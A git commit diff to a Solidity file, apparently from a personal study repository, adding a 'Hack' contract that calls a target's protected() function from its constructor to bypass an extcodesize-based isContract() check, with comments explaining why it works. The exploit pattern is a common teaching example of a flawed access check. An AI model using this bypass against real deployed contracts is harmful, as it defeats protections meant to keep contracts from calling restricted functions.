be3e6d1041e488cc0b442fb3ba3cf469210891fe
jinwon93 <kjw8208@nate.com>
2022-07-12 21:08:34 +0900

    20220712

--- Applications/BypassContract.sol
+++ Applications/BypassContract.sol
@@ -32,3 +32,17 @@ contract FailedAttack {
         Target(_target).protected();
     }
 }
+
+contract Hack {
+    bool public isContract;
+    address public addr;
+
+    // When contract is being created, code size (extcodesize) is 0.
+    // This will bypass the isContract() check
+    constructor(address _target) {
+        isContract = Target(_target).isContract(address(this));
+        addr = address(this);
+        // This will work
+        Target(_target).protected();
+    }
+}
